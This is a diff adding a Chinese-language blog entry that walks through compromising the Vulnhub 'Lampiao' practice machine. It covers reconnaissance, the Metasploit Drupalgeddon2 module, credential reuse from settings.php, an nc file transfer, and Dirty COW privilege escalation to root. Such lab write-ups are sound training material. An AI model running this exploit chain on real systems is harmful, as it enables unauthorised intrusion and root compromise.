@@ -1084,4 +1084,20 @@ echo 123;
         <tag>msf</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Lampiao靶机</title>
+    <url>/2021/12/20/Lampiao%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<h1 id="Lampiao靶机"><a href="#Lampiao靶机" class="headerlink" title="Lampiao靶机"></a>Lampiao靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/">下载地址</a><br>目标:获得root权限</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap获得靶机信息<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220083440.png" alt="靶机信息"><br>除了22  80 端口还开放了一个1898端口。在80端口上只有一个静态网页，没有可用的信息。到1898端口上查看。使用dirb扫描后，发现robots.txt文件。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220092046.png" alt="dirb结果"><br>进入robots.txt文件，发现禁止爬取的文件中有CHANGELOG.txt.<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220092155.png"><br>进入Changelog.txt文件发现，该网站为 Drupal的cms。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220092245.png"><br>进入msf查看是否存在可以利用的exp。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220093240.png"><br>使用<code>exploit/unix/webapp/drupal_drupalgeddon2 </code>，并设置参数后运行。<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220093340.png" alt="msf参数"><br>成功后输入<code>shell</code>获得www-data权限。<br>在<code>/var/www/html/sites/default/settings.php</code>文件中获得数据库连接帐号:drupaluser, 密码:Virgulino.在home文件夹中发现存在用户tiago<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220093801.png"><br>使用数据库连接密码连接tiago帐号成功。<br>使用脏牛提权的条件为<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220094023.png" alt="脏牛提权"><br>通过<code>uname -a</code>查看当前版本符合脏牛提权条件。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211220094128.png" alt="当前系统版本"><br><code>tar -czvf dcow.tar.gz CVE-2016-5195-master</code>压缩文件夹。<br>通过nc传输文件<br>靶机<code>nc -l 4444 &gt; dcow.tar.gz</code><br>攻击机<code>nc 10.1.1.133 4444 &lt; dcow.tar.gz</code><br>靶机使用<code>tar -xzvf dcow.tar.gz</code>解压文件夹后，进入文件夹。使用<code>make</code>指令生产dcow可执行文件，运行后获得root权限。</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>Vulnhub</tag>
+        <tag>Linux提权</tag>
+        <tag>脏牛提权</tag>
+      </tags>
+  </entry>
 </search>
